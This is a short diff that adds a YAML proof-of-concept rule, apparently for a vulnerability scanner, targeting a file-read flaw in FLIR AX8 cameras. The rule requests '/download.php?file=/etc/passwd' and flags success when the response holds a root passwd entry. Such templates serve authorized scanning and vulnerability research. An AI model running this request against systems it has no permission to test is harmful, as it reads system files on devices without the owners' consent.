@@ -1,0 +1,11 @@
+name: poc-yaml-flir-ax8-file-read
+rules:
+  - method: GET
+    path: "/download.php?file=/etc/passwd"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://juejin.cn/post/6961370156484263972
